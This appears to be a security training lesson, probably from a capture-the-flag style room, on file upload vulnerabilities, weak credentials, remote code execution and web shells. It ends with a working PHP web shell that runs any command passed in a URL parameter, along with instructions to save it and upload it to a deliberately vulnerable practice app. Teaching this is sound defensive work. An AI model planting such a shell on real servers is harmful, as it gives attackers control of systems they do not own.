File Upload Vulnerabilities

File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:

    RCE: Uploading a script that the server runs gives the attacker control over it.
    XSS: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker's server.

These can happen if a site doesn't properly secure its file upload functionality.

Why Unrestricted File Uploads Are Dangerous

Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.

Examples of abuse through unrestricted file uploads include:

    Uploading a script that the server executes, leading to RCE.
    Uploading a crafted image file that triggers a vulnerability when processed by the server.
    Uploading a web shell and browsing to it directly using a browser

Usage of Weak Credentials

One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.

What is Remote Code Execution (RCE)

Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.

Frosty Pines Hotel Key Graphic

What Is a Web Shell

A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.

For example, attackers could use a web shell to:

    Execute commands on the server
    Move laterally within the network
    Download sensitive data or pivot to other services

A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.

Okay, now that we're familiar with a remote code execution vulnerability and how it works, let's take a look at how we would exploit it!

Practice Makes Perfect

To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an open-source railway management system that has this vulnerability built into it. 

Exploiting RCE via File Upload

Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.

Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.
**
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>

**
